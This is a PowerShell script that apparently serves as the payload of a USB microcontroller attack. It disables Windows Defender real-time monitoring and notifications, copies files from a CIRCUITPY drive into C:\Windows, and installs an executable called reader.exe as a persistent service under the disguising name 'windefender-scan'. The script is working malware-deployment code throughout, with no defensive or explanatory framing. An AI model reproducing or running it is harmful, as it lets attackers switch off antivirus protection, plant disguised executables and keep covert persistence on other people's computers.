# Function to log messages to the console
function Log-Message {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp - $message"
    Write-Host $logEntry
}

# Log start of script
Log-Message "Script started."

# Disable Enhanced Notifications
try {
    Log-Message "Disabling Enhanced Notifications..."
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name DisableEnhancedNotifications -Value 1
    Log-Message "Enhanced Notifications disabled."
} catch {
    Log-Message "Error disabling Enhanced Notifications: $_"
}

# Disable Real-Time Monitoring
try {
    Log-Message "Disabling Real-Time Monitoring..."
    Set-MpPreference -DisableRealtimeMonitoring $true
    Log-Message "Real-Time Monitoring disabled."
} catch {
    Log-Message "Error disabling Real-Time Monitoring: $_"
}

# Find the CIRCUITPY drive
Log-Message "Searching for CIRCUITPY drive..."
$driveLetter = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "CIRCUITPY" } | Select-Object -ExpandProperty DeviceID

if ($driveLetter) {
    Log-Message "CIRCUITPY drive found: $driveLetter."
    $sourcePath = Join-Path $driveLetter "data"
    $destinationPath = "C:\Windows"

    # Check if the source path exists
    if (Test-Path $sourcePath) {
        Log-Message "Source path exists: $sourcePath. Copying files..."
        Copy-Item -Path "$sourcePath\*" -Destination $destinationPath -Recurse -Force
        Log-Message "Files copied to $destinationPath."
        
        Set-Location -Path $destinationPath

        # Define NSSM path and service parameters
        $nssmPath = Join-Path $destinationPath "nssm.exe"
        $serviceName = "windefender-scan"
        $exePath = Join-Path $destinationPath "reader.exe"

        # Check if NSSM and reader.exe exist
        if ((Test-Path $nssmPath) -and (Test-Path $exePath)) {
            Log-Message "nssm.exe and reader.exe found. Installing service..."
            try {
                & $nssmPath install $serviceName $exePath
                & $nssmPath start $serviceName
                Log-Message "Service installed and started successfully."
            } catch {
                Log-Message "Error installing or starting the service: $_"
            }
        } else {
            Log-Message "Error: nssm.exe or reader.exe not found in $destinationPath."
        }
    } else {
        Log-Message "Error: Source folder 'data' not found on CIRCUITPY drive."
    }
} else {
    Log-Message "Error: CIRCUITPY drive not found."
}

# Log end of script
Log-Message "Script completed."
